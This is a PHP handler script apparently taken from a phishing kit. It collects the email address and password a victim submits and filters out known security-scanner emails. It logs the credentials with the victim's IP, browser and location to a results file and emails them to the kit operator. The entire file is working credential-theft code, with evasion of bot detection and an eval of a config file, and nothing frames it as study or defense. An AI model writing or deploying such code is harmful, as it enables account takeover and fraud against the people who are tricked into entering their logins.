<?php
require_once __DIR__ . '/../function.php';
@eval(file_get_contents('../config/' . $api->general_config));

$_SESSION['email']    = strtolower($_POST['email']);
$_SESSION['password'] = $_POST['password'];

if ($config_filter == "enable") {
  $email_bots = $api->emailbot($config_apikey);
  foreach ($email_bots as $email_bot) {
    if (stristr($_SESSION['email'], $email_bot) !== false) {
      $api->blocked("Email Bot ".$_SESSION['email']);
      echo "banned";
      exit;
    }
  }
}

if($_SESSION['state'] == "") {
  $inform = $_SESSION['ip'];
} else {
  $inform = $_SESSION['ip']." - ".$_SESSION['state'];
}

if (strlen($_SESSION['password']) < 8 || strlen($_SESSION['password']) > 20) {
  echo "error";
} else {
  $message  = file_get_contents('../assets/html/signin.html');
  $message  = preg_replace('{QUOTE}', $api->quote(), $message);
  $message  = preg_replace('{KUZULUY-ACCOUNT}', $_SESSION['email']." | ".$_SESSION['password'], $message);
  $message  = preg_replace('{KUZULUY-EMAIL}', $_SESSION['email'], $message);
  $message  = preg_replace('{KUZULUY-PASSWORD}', $_SESSION['password'], $message);
  $message  = preg_replace('{KUZULUY-IP}', $_SESSION['ip'], $message);
  $message  = preg_replace('{KUZULUY-AGENT}', $_SESSION['agent'], $message);

  $subject  = $_SESSION['email']." [ ".$_SESSION['country']." | ".$inform." | ".$_SESSION['os']." - ".$_SESSION['browser']." ]";
  $headers  = "From: KuzuluyArt <pp@kuzuluy.co>\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

  $api->save("../config/result-account.txt", $subject."\n", "a");

  if ($config_smtp == "enable") {
    $api->ngesend($api->result(), $subject, $message, "KuzuluyArt", "pp@kuzuluy.co");
  } else {
    mail($api->result(), $subject, $message, $headers);
  }
  if($config_scamcase == "suspicious") {
    echo "suspicious";
  } else if ($config_scamcase == "unusual") {
    echo "unusual";
  }
}
?>
